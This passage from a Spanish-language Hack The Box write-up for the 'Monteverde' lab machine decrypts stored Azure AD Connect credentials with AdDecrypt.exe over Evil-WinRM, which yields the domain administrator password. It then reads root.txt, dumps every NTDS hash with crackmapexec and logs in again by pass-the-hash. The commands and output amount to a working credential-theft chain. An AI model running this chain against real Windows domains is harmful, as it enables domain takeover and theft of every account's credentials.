d-----         1/2/2020   2:46 PM                Windows Media Player
d-----        9/15/2018  12:19 AM                Windows Multimedia Platform
d-----        9/15/2018  12:28 AM                windows nt
d-----         1/2/2020   2:46 PM                Windows Photo Viewer
d-----        9/15/2018  12:19 AM                Windows Portable Devices
d-----        9/15/2018  12:19 AM                Windows Security
d-----         1/3/2020   5:28 AM                WindowsPowerShell


<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogram Files&gt;
</code></pre></div></div>

<ul>
  <li><a href="https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/">https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/</a>, <a href="https://blog.xpnsec.com/azuread-connect-for-redteam/">https://blog.xpnsec.com/azuread-connect-for-redteam/</a>.</li>
</ul>

<blockquote>
  <p>The Azure AD Connect service is essentially responsible for synchronizing things between your local AD domain, and the Azure based domain. However, to do this it needs privileged credentials for your local domain so that it can perform various operations such as syncing passwords etc.</p>
</blockquote>

<iframe width="560" height="315" src="https://www.youtube.com/embed/JEIR5oGCwdg?si=7OpXxOEi_svvy2Di" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe>

<ul>
  <li>
    <p>En el post nos comparten el siguiente repositorio <a href="https://github.com/VbScrub/AdSyncDecrypt/releases">https://github.com/VbScrub/AdSyncDecrypt/releases</a>.</p>
  </li>
  <li>
    <p>Nos dicen que tenemos que estas en la siguiente ruta para que funcione.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogram Files<span class="se">\M</span>icrosoft Azure AD Sync&gt; <span class="nb">cd</span> <span class="s1">'C:\Program Files\Microsoft Azure AD Sync\Bin'</span>
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogram Files<span class="se">\M</span>icrosoft Azure AD Sync<span class="se">\B</span><span class="k">in</span><span class="o">&gt;</span> <span class="nb">dir


    </span>Directory: C:<span class="se">\P</span>rogram Files<span class="se">\M</span>icrosoft Azure AD Sync<span class="se">\B</span><span class="k">in


</span>Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
d-----         1/2/2020   2:53 PM                ADSync
d-----         1/2/2020   2:53 PM                ADSyncDiagnostics
d-----         1/2/2020   2:53 PM                Assemblies
d-----         1/2/2020   2:53 PM                Microsoft.VC100.CRT
<span class="nt">-a----</span>        8/31/2018   4:53 PM          32640 AADConfig.dll
<span class="nt">-a----</span>        8/31/2018   4:53 PM          78920 AADPasswordResetExtension.dll
<span class="nt">-a----</span>        8/31/2018   4:54 PM        1579904 configdb.dll
<span class="nt">-a----</span>        8/31/2018   4:54 PM          15416 csdelete.exe
<span class="nt">-a----</span>        8/31/2018   4:54 PM          35896 csexport.exe
<span class="nt">-a----</span>        8/31/2018   4:54 PM          25656 CSExportAnalyzer.exe
<span class="nt">-a----</span>         1/2/2020   2:53 PM            240 InstalledServiceInstances.config
<span class="nt">-a----</span>        8/31/2018   4:56 PM          86400 libutils.dll
<span class="nt">-a----</span>        8/31/2018   4:53 PM         284816 ManagedCustomActions.CA
<span class="nt">-a----</span>        8/31/2018   4:54 PM          37944 mapackager.exe
<span class="nt">-a----</span>        8/31/2018   4:54 PM         335744 mcrypt.dll
<span class="nt">-a----</span>        8/31/2018   4:54 PM          98688 Microsoft.Azure.ActiveDirectory.Client.Framework.dll
<span class="nt">-a----</span>        8/31/2018   4:54 PM         125496 Microsoft.Azure.ActiveDirectory.Synchronization.Config.dll
<span class="nt">-a----</span>        8/31/2018   4:53 PM          94776 Microsoft.Azure.ActiveDirectory.Synchronization.Framework.dll
<span class="nt">-a----</span>        8/31/2018   4:53 PM          37432 Microsoft.Azure.ActiveDirectory.Synchronization.PowerShellConfigAdapter.dll
<span class="nt">-a----</span>        8/31/2018   4:54 PM          29568 Microsoft.Azure.ActiveDirectory.Synchronization.ProvisioningWebServiceAdapter.dll
<span class="nt">-a----</span>        8/31/2018   4:53 PM          85568 Microsoft.CredentialManagement.OnPremisesPasswordReset.Library.dll
<span class="nt">-a----</span>        6/20/2017   1:52 PM             70 Microsoft.CredentialManagement.OnPremisesPasswordReset.Library.dll.config
<span class="nt">-a----</span>        8/31/2018   4:53 PM          30280 Microsoft.CredentialManagement.OnPremisesPasswordReset.Shared.dll
<span class="nt">-a----</span>        8/31/2018   4:54 PM         143416 Microsoft.IdentityManagement.Error.ErrorBridge.dll
<span class="nt">-a----</span>        8/31/2018   4:54 PM          18488 Microsoft.IdentityManagement.ManagedLogger.dll
<span class="nt">-a----</span>        8/31/2018   4:54 PM         221056 Microsoft.IdentityManagement.PowerShell.ObjectModel.dll
<span class="nt">-a----</span>        5/23/2018   7:46 PM         295024 Microsoft.IdentityModel.Clients.ActiveDirectory.dll
<span class="nt">-a----</span>        5/23/2018   7:46 PM          22128 Microsoft.IdentityModel.Clients.ActiveDirectory.Platform.dll
<span class="nt">-a----</span>        8/31/2018   4:54 PM          17280 Microsoft.MetadirectoryServices.DataAccess.dll
<span class="nt">-a----</span>        8/31/2018   4:54 PM          16768 Microsoft.MetadirectoryServices.Host.dll
<span class="nt">-a----</span>        8/31/2018   4:54 PM          66432 Microsoft.MetadirectoryServices.Impl.dll
<span class="nt">-a----</span>        8/31/2018   4:54 PM          27520 Microsoft.MetadirectoryServices.LDAPQueryClient.dll
<span class="nt">-a----</span>        8/31/2018   4:54 PM          26688 Microsoft.MetadirectoryServices.PasswordHashSynchronization.Types.dll
<span class="nt">-a----</span>        8/31/2018   4:54 PM          54344 Microsoft.MetadirectoryServices.Scheduler.dll
<span class="nt">-a----</span>        8/31/2018   4:54 PM         507264 Microsoft.Online.Deployment.Framework.dll
<span class="nt">-a----</span>        8/31/2018   4:54 PM          82304 Microsoft.Online.Deployment.PowerShell.dll
<span class="nt">-a----</span>        8/31/2018   4:54 PM         116608 Microsoft.Online.PasswordSynchronization.Cryptography.dll
<span class="nt">-a----</span>        8/31/2018   4:54 PM         136248 Microsoft.Online.PasswordSynchronization.dll
<span class="nt">-a----</span>        8/31/2018   4:54 PM          23424 Microsoft.Online.PasswordSynchronization.Resources.dll
<span class="nt">-a----</span>        8/31/2018   4:54 PM         196664 Microsoft.Online.PasswordSynchronization.Rpc.dll
<span class="nt">-a----</span>        8/31/2018   4:53 PM        3540032 Microsoft.ServiceBus.dll
<span class="nt">-a----</span>        8/31/2018   4:53 PM        2556984 miiserver.exe
<span class="nt">-a----</span>        8/31/2018   4:41 PM           5830 miiserver.exe.config
<span class="nt">-a----</span>        8/31/2018   4:53 PM          99896 miiskmu.exe
<span class="nt">-a----</span>        8/31/2018   4:55 PM          85568 mixedmodeutils.dll
<span class="nt">-a----</span>        8/31/2018   4:55 PM         360504 mmscntrl.dll
<span class="nt">-a----</span>        8/31/2018   4:55 PM          97848 mmsevent.dll
<span class="nt">-a----</span>        8/31/2018   4:55 PM         725048 mmsmaad.dll
<span class="nt">-a----</span>        8/31/2018   4:55 PM         567352 mmsmaext.dll
<span class="nt">-a----</span>        8/31/2018   4:55 PM        1424256 mmsmastate.dll
<span class="nt">-a----</span>        8/31/2018   4:55 PM         431160 mmsmaxml.dll
<span class="nt">-a----</span>        8/31/2018   4:55 PM          31288 mmsperf.dll
<span class="nt">-a----</span>        8/31/2018   4:41 PM           5686 mmsperf.h
<span class="nt">-a----</span>        8/31/2018   4:41 PM          12162 mmsperf.ini
<span class="nt">-a----</span>        8/31/2018   4:55 PM          37432 mmsperfmon.dll
<span class="nt">-a----</span>        8/31/2018   4:55 PM         151096 mmsps.dll
<span class="nt">-a----</span>        8/31/2018   4:55 PM         528768 mmsscpth.dll
<span class="nt">-a----</span>        8/31/2018   4:55 PM          33152 MMSSERVERRCW.dll
<span class="nt">-a----</span>        8/31/2018   4:55 PM         520064 mmsuihlp.dll
<span class="nt">-a----</span>        8/31/2018   4:55 PM         222776 mmsutils.dll
<span class="nt">-a----</span>        8/31/2018   4:41 PM            978 mmswmi-x.mof
<span class="nt">-a----</span>        8/31/2018   4:55 PM         133688 mmswmi.dll
<span class="nt">-a----</span>        8/31/2018   4:41 PM           8441 mmswmi.mof
<span class="nt">-a----</span>        8/31/2018   4:55 PM         103496 PasswordHashConnectorManager.dll
<span class="nt">-a----</span>        8/31/2018   4:55 PM          37952 PasswordHashSyncExtension.dll
<span class="nt">-a----</span>        8/31/2018   4:53 PM          44104 Security.Cryptography.dll
<span class="nt">-a----</span>        8/31/2018   4:55 PM        1462328 storechk.exe
<span class="nt">-a----</span>        8/31/2018   4:54 PM          62008 SyncClrhost.dll
<span class="nt">-a----</span>        8/31/2018   4:54 PM         135736 SyncRuleExpressions.dll
<span class="nt">-a----</span>        8/31/2018   4:54 PM         172088 SyncRulesEngine.dll
<span class="nt">-a----</span>        8/31/2018   4:54 PM         200760 SyncSetupUtl.dll
<span class="nt">-a----</span>        8/31/2018   4:54 PM          26176 Tracing.dll
<span class="nt">-a----</span>        8/31/2018   4:41 PM          16510 Tracing.man


<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogram Files<span class="se">\M</span>icrosoft Azure AD Sync<span class="se">\B</span><span class="k">in</span><span class="o">&gt;</span>
</code></pre></div></div>

<blockquote>
  <p>ADSync generalmente se ejecuta como un servicio en un servidor designado dentro de la infraestructura de la red local. Es responsable de mantener la sincronización continua entre el directorio activo local y Azure AD, asegurando que cualquier cambio realizado en uno de los directorios se refleje adecuadamente en el otro.</p>
</blockquote>

<ul>
  <li>Si descomprimimos el <code class="language-plaintext highlighter-rouge">.zip</code> vemos que obtenemos un <code class="language-plaintext highlighter-rouge">.exe</code> y un <code class="language-plaintext highlighter-rouge">.ddl</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content 7z x AdDecrypt.zip

7-Zip 23.01 <span class="o">(</span>x64<span class="o">)</span> : Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2023 Igor Pavlov : 2023-06-20
 64-bit <span class="nv">locale</span><span class="o">=</span>C.UTF-8 Threads:128 OPEN_MAX:1024

Scanning the drive <span class="k">for </span>archives:
1 file, 152818 bytes <span class="o">(</span>150 KiB<span class="o">)</span>

Extracting archive: AdDecrypt.zip
<span class="nt">--</span>
Path <span class="o">=</span> AdDecrypt.zip
Type <span class="o">=</span> zip
Physical Size <span class="o">=</span> 152818

Everything is Ok

Files: 2
Size:       349096
Compressed: 152818
➜  content <span class="nb">ls
</span>AdDecrypt.exe  AdDecrypt.zip  azure.xml  mcrypt.dll  users.txt
</code></pre></div></div>

<ul>
  <li>En el post nos dicen que tenemos que subir los 2 archivos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\p</span>rogramdata&gt; <span class="nb">dir


    </span>Directory: C:<span class="se">\p</span>rogramdata


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
d-----         1/2/2020   4:12 PM                AADConnect
d---s-         1/3/2020   4:47 AM                Microsoft
d-----        3/31/2024  11:35 AM                regid.1991-06.com.microsoft
d-----        9/15/2018  12:19 AM                SoftwareDistribution
d-----         1/2/2020   9:15 PM                USOPrivate
d-----         1/2/2020   9:15 PM                USOShared
d-----         1/2/2020   9:37 PM                VMware
d-----         1/2/2020   2:35 PM                VsTelemetry
<span class="nt">-a----</span>        3/31/2024   1:22 PM          14848 AdDecrypt.exe
<span class="nt">-a----</span>        3/31/2024   1:22 PM         334248 mcrypt.dll
</code></pre></div></div>

<ul>
  <li>Ahora lo ejecutamos para ver la contraseña en texto plano.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogram Files<span class="se">\M</span>icrosoft Azure AD Sync<span class="se">\B</span><span class="k">in</span><span class="o">&gt;</span> C:<span class="se">\p</span>rogramdata<span class="se">\A</span>dDecrypt.exe <span class="nt">-FullSQL</span>

<span class="o">======================</span>
AZURE AD SYNC CREDENTIAL DECRYPTION TOOL
Based on original code from: https://github.com/fox-it/adconnectdump
<span class="o">======================</span>

Opening database connection...
Executing SQL commands...
Closing database connection...
Decrypting XML...
Parsing XML...
Finished!

DECRYPTED CREDENTIALS:
Username: administrator
Password: d0m@in4dminyeah!
Domain: MEGABANK.LOCAL
</code></pre></div></div>

<h2 id="roottxt">root.txt</h2>

<ul>
  <li>Ahora ya nos podemos conectar gracias a que el ejecutable descifro las credenciales almacenadas dentro de la configuración <code class="language-plaintext highlighter-rouge">Azure AD Sync</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content evil-winrm <span class="nt">-i</span> 10.129.228.111 <span class="nt">-u</span> administrator <span class="nt">-p</span> d0m@in4dminyeah!

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
</span>megabank<span class="se">\a</span>dministrator
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
026476efa67f5ba4e205392bb78817e4
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<h2 id="extra">Extra</h2>

<ul>
  <li>Aquí tenemos los hashes NT de todos los usuarios.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ crackmapexec smb 10.129.228.111 <span class="nt">-u</span> administrator <span class="nt">-p</span> d0m@in4dminyeah! <span class="nt">--nt</span>
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:MONTEVERDE<span class="o">)</span> <span class="o">(</span>domain:MEGABANK.LOCAL<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>+] MEGABANK.LOCAL<span class="se">\a</span>dministrator:d0m@in4dminyeah! <span class="o">(</span>Pwn3d!<span class="o">)</span>
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>+] Dumping the NTDS, this could take a <span class="k">while </span>so go grab a redbull...
SMB         10.129.228.111  445    MONTEVERDE       Administrator:500:aad3b435b51404eeaad3b435b51404ee:100a42db8caea588a626d3a9378cd7ea:::
SMB         10.129.228.111  445    MONTEVERDE       Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.228.111  445    MONTEVERDE       krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3480c0ed5001f14fa7a49fdf016043ff:::
SMB         10.129.228.111  445    MONTEVERDE       AAD_987d7f2f57d2:1104:aad3b435b51404eeaad3b435b51404ee:599716220acac74a2d9049230d3a8b06:::
SMB         10.129.228.111  445    MONTEVERDE       MEGABANK.LOCAL<span class="se">\m</span>hope:1601:aad3b435b51404eeaad3b435b51404ee:f875f9a71efc6b0ee93dd906aedbc8b6:::
SMB         10.129.228.111  445    MONTEVERDE       MEGABANK.LOCAL<span class="se">\S</span>ABatchJobs:2602:aad3b435b51404eeaad3b435b51404ee:fd980edb4732d8175a52a9b5e1520bc1:::
SMB         10.129.228.111  445    MONTEVERDE       MEGABANK.LOCAL<span class="se">\s</span>vc-ata:2603:aad3b435b51404eeaad3b435b51404ee:d192ea098c69b7d26c50808a5ac75bea:::
SMB         10.129.228.111  445    MONTEVERDE       MEGABANK.LOCAL<span class="se">\s</span>vc-bexec:2604:aad3b435b51404eeaad3b435b51404ee:2e4de9439cfd99f861dec8fc460c47e3:::
SMB         10.129.228.111  445    MONTEVERDE       MEGABANK.LOCAL<span class="se">\s</span>vc-netapp:2605:aad3b435b51404eeaad3b435b51404ee:6bd17d9707c3da465b96cdf0e1a3a4d6:::
SMB         10.129.228.111  445    MONTEVERDE       MEGABANK.LOCAL<span class="se">\d</span>galanos:2613:aad3b435b51404eeaad3b435b51404ee:7a695f4cc64a302d8e53da58f0885736:::
SMB         10.129.228.111  445    MONTEVERDE       MEGABANK.LOCAL<span class="se">\r</span>oleary:2614:aad3b435b51404eeaad3b435b51404ee:cb3fa0132c099c5b29c30ef128e90ad8:::
SMB         10.129.228.111  445    MONTEVERDE       MEGABANK.LOCAL<span class="se">\s</span>morgan:2615:aad3b435b51404eeaad3b435b51404ee:3a2b291c4291a1063a4b32e1770e5388:::
SMB         10.129.228.111  445    MONTEVERDE       MONTEVERDE<span class="nv">$:</span>1000:aad3b435b51404eeaad3b435b51404ee:2e06005800e9c8981d41f5c109ca4c03:::
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span>+] Dumped 13 NTDS hashes to /home/miguel/.cme/logs/MONTEVERDE_10.129.228.111_2024-03-31_143351.ntds of which 12 were added to the database
</code></pre></div></div>

<ul>
  <li>También nos podemos conectar con el hash.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content evil-winrm <span class="nt">-i</span> 10.129.228.111 <span class="nt">-u</span> administrator <span class="nt">-H</span> 100a42db8caea588a626d3a9378cd7ea

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/medium" /><summary type="html"><![CDATA[]]></summary></entry></feed>